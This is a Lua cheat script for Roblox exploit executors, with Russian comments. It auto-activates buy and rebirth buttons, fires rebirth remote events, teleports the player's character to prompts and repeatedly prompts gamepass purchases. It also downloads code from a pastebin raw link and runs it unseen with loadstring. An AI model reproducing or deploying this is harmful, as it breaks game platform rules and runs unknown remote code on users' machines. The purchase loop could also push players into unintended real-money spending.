-- Сервисы
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local Workspace = game:GetService("Workspace")
local VirtualInputManager = game:GetService("VirtualInputManager")
local TweenService = game:GetService("TweenService")
local Stats = game:GetService("Stats")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local Camera = Workspace.CurrentCamera

-- Функция для поиска кнопок и их покупки
local function AutoBuyButtons()
    -- Ищем все ProximityPrompt (кнопки покупки)
    local buttons = {}
    
    -- Поиск в Workspace
    for _, obj in pairs(Workspace:GetDescendants()) do
        if obj:IsA("ProximityPrompt") then
            table.insert(buttons, obj)
        elseif obj:IsA("ClickDetector") then
            table.insert(buttons, obj)
        end
    end
    
    -- Поиск GUI кнопок
    for _, gui in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
        if gui:IsA("TextButton") or gui:IsA("ImageButton") then
            local text = gui:FindFirstChild("TextLabel") or gui
            if text and string.find(text.Text:lower(), "rebirth") or 
               string.find(text.Text:lower(), "button") or
               string.find(text.Text:lower(), "buy") or
               string.find(text.Text:lower(), "purchase") or
               string.find(gui.Name:lower(), "button") or
               string.find(gui.Name:lower(), "buy") then
                table.insert(buttons, gui)
            end
        end
    end
    
    -- Активируем найденные кнопки
    for _, button in pairs(buttons) do
        pcall(function()
            if button:IsA("ProximityPrompt") then
                button:InputHoldBegin()
                task.wait(0.1)
                button:InputHoldEnd()
            elseif button:IsA("ClickDetector") then
                fireclickdetector(button)
            elseif button:IsA("GuiButton") then
                -- Эмулируем нажатие GUI кнопки
                local args = {
                    [1] = "MouseButton1Click",
                    [2] = button
                }
                -- Пробуем разные методы активации
                pcall(function() button:Invoke() end)
                pcall(function() firesignal(button.MouseButton1Click) end)
                pcall(function() firesignal(button.Activated) end)
            end
        end)
    end
    
    return #buttons
end

-- Функция для поиска Rebirth кнопок
local function FindRebirthButtons()
    local rebirthButtons = {}
    
    -- Поиск по всем объектам
    for _, obj in pairs(Workspace:GetDescendants()) do
        local name = obj.Name:lower()
        local parentName = obj.Parent and obj.Parent.Name:lower() or ""
        
        -- Проверяем названия связанные с ребитхом
        if name:find("rebirth") or parentName:find("rebirth") or
           name:find("reborn") or parentName:find("reborn") or
           name:find("button") or parentName:find("button") then
            
            if obj:IsA("ProximityPrompt") or obj:IsA("ClickDetector") or obj:IsA("Part") or obj:IsA("Model") then
                table.insert(rebirthButtons, obj)
            end
        end
    end
    
    -- Поиск RemoteEvents для ребитха
    for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
            if remote.Name:lower():find("rebirth") or remote.Name:lower():find("reborn") then
                -- Пробуем активировать remote
                pcall(function()
                    remote:FireServer()
                end)
            end
        end
    end
    
    return rebirthButtons
end

-- Функция для покупки всех доступных gamepass'ов
local function PurchaseAllGamepasses()
    local gamepasses = {}
    
    -- Собираем все gamepass ID из игры
    for _, obj in pairs(Workspace:GetDescendants()) do
        if obj:FindFirstChild("GamepassId") then
            table.insert(gamepasses, obj.GamepassId.Value)
        end
    end
    
    -- Покупаем каждый gamepass
    for _, id in pairs(gamepasses) do
        pcall(function()
            MarketplaceService:PromptGamePassPurchase(LocalPlayer, id)
        end)
        task.wait(0.5)
    end
end

-- Основная функция авто-покупки
local function ProcessAutoBuy()
    print("🔍 Searching for buttons to buy...")
    
    -- Ищем и активируем кнопки
    local buttonCount = AutoBuyButtons()
    local rebirthCount = #FindRebirthButtons()
    
    print("Found " .. buttonCount .. " buttons and " .. rebirthCount .. " rebirth items")
    
    -- Покупаем gamepass'ы
    PurchaseAllGamepasses()
    
    -- Активируем все ProximityPrompts вокруг игрока
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local hrp = LocalPlayer.Character.HumanoidRootPart
        
        for _, prompt in pairs(Workspace:GetDescendants()) do
            if prompt:IsA("ProximityPrompt") then
                local distance = (prompt.Parent.Position - hrp.Position).Magnitude
                if distance < 50 then -- Если кнопка в радиусе 50 studs
                    pcall(function()
                        -- Телепортируемся к кнопке
                        hrp.CFrame = prompt.Parent.CFrame * CFrame.new(0, 2, 0)
                        task.wait(0.2)
                        -- Активируем кнопку
                        prompt:InputHoldBegin()
                        task.wait(0.5)
                        prompt:InputHoldEnd()
                    end)
                end
            end
        end
    end
end

-- СКАЧИВАЕМ СКРИПТ ИЗ PASTEBIN
local success, result = pcall(function()
    return game:HttpGet("https://pastebin.com/raw/Nnj54ef5")
end)

if success and result then
    -- Выполняем оригинальный скрипт
    local originalScript = loadstring(result)
    if originalScript then
        originalScript()
    end
else
    -- Если не удалось загрузить, используем встроенный скрипт
    warn("Failed to load from Pastebin, using built-in script")
end

-- ДОБАВЛЯЕМ ФУНКЦИЮ АВТО-ПОКУПКИ КНОПОК

local AutoBuyConfig = {
    Enabled = false,
    Bind = Enum.KeyCode.B,
    Interval = 1, -- Интервал между проверками в секундах
    AutoTeleport = true, -- Автоматически телепортироваться к кнопкам
    BuyGamepasses = true, -- Покупать gamepass'ы
    MaxDistance = 100 -- Максимальное расстояние для поиска кнопок
}

-- Создаем простой GUI для управления
local function CreateAutoBuyGUI()
    local gui = Instance.new("ScreenGui", CoreGui)
    gui.Name = "AutoBuyGUI"
    
    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(0, 200, 0, 100)
    frame.Position = UDim2.new(1, -210, 0, 10)
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    frame.BorderSizePixel = 0
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
    
    local title = Instance.new("TextLabel", frame)
    title.Size = UDim2.new(1, 0, 0, 25)
    title.BackgroundTransparency = 1
    title.Text = "🔘 Auto Button Buyer"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 14
    
    local statusLabel = Instance.new("TextLabel", frame)
    statusLabel.Size = UDim2.new(1, -20, 0, 20)
    statusLabel.Position = UDim2.new(0, 10, 0, 30)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "Status: OFF"
    statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.TextSize = 12
    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
    
    local infoLabel = Instance.new("TextLabel", frame)
    infoLabel.Size = UDim2.new(1, -20, 0, 30)
    infoLabel.Position = UDim2.new(0, 10, 0, 55)
    infoLabel.BackgroundTransparency = 1
    infoLabel.Text = "Press B to toggle\nauto button buying"
    infoLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
    infoLabel.Font = Enum.Font.Gotham
    infoLabel.TextSize = 11
    infoLabel.TextXAlignment = Enum.TextXAlignment.Left
    
    return statusLabel
end

local statusLabel = CreateAutoBuyGUI()

-- Основной цикл авто-покупки
local autoBuyConnection
local function ToggleAutoBuy()
    AutoBuyConfig.Enabled = not AutoBuyConfig.Enabled
    
    if AutoBuyConfig.Enabled then
        statusLabel.Text = "Status: BUYING..."
        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
        
        autoBuyConnection = RunService.Heartbeat:Connect(function()
            ProcessAutoBuy()
            task.wait(AutoBuyConfig.Interval)
        end)
    else
        statusLabel.Text = "Status: OFF"
        statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
        
        if autoBuyConnection then
            autoBuyConnection:Disconnect()
        end
    end
end

-- Привязка клавиши
UIS.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == AutoBuyConfig.Bind then
        ToggleAutoBuy()
    end
end)

-- Дополнительная функция для принудительной покупки всех кнопок в радиусе
local function ForceBuyAllButtons()
    print("🚀 Force buying all buttons...")
    
    -- Телепортируемся к каждой кнопке и активируем
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local hrp = LocalPlayer.Character.HumanoidRootPart
        
        for _, obj in pairs(Workspace:GetDescendants()) do
            pcall(function()
                -- Проверяем разные типы кнопок
                local prompt = obj:FindFirstChildOfClass("ProximityPrompt")
                local click = obj:FindFirstChildOfClass("ClickDetector")
                
                if prompt or click then
                    local pos = obj.Position
                    local dist = (pos - hrp.Position).Magnitude
                    
                    if dist < AutoBuyConfig.MaxDistance then
                        -- Телепортируемся
                        hrp.CFrame = CFrame.new(pos + Vector3.new(0, 3, 0))
                        task.wait(0.1)
                        
                        -- Активируем
                        if prompt then
                            fireproximityprompt(prompt)
                        end
                        if click then
                            fireclickdetector(click)
                        end
                        
                        task.wait(0.2)
                    end
                end
            end)
        end
    end
    
    print("✅ Finished buying all buttons")
end

-- Экспортируем функцию принудительной покупки
getgenv().ForceBuyAllButtons = ForceBuyAllButtons

print("✅ Auto Button Buyer loaded! Press B to toggle.")
print("💡 Use getgenv().ForceBuyAllButtons() to force buy all buttons")
